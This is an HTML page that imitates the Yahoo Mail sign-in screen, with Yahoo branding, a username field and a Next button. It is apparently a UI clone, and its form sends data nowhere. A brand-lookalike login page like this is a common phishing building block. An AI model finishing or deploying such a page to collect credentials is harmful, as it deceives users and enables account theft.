<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Home - Website</title>
	<link rel="stylesheet" href="yahoo.css"/>
	<link rel="shortcut icon" href="boch.ico"/>
</head>
<body>
	<header>
		<a href=""><img class="logo" src="yahoo.png"/></a>
		<a href=""><p class="help">Help</p></a>
	</header>

	<section class="container">
		<div class="log">
			<div class="inlogo_con">
				<img class="inlogo" src="yahoo.png"/>
			</div>
			<div class="challenge">
				<div class="challenge-header">
				</div>
				<div class="username-challenge">
					<strong class="challenge-heading">Sign in to Yahoo Mail</strong>
					<span class="challenge-desc">Using your Yahoo account</span>
					<form id="login-username-form" method="POST">
						<div class="input-group">
							<input class="input-no" type="text" placeholder="Username, email or mobile"/>
						</div>
						<div class="button-container">
							<input id="login-signin" type="submit" value="Next"/>
						</div>
						<div class="challenge-opt">
							<div class="stay-opt">
								<span class="stay-signed-in">
									<input id="persistent" type="checkbox" checked/>
									<label for="persistent">Stay signed in</label>
								</span>
							</div>
							<div class="forgot-opt">
								<span class="hellp">
									<a href="">Forgot username?</a>
								</span>
							</div>
						</div>
						<div class="bottom-link-container">
							<p class="signup-link">
								<a href="" class="pure-button">Create an account</a>
							</p>
							
						</div>
					</form>
				</div>
				
			</div>
		</div>

	</section>
	<footer class="footer-link">
		<div class="link">
			<p><a class="help" href="">Terms</a> | <a class="help" href="">Privacy</a></p>
		</div>
	</footer>

</body>
</html>
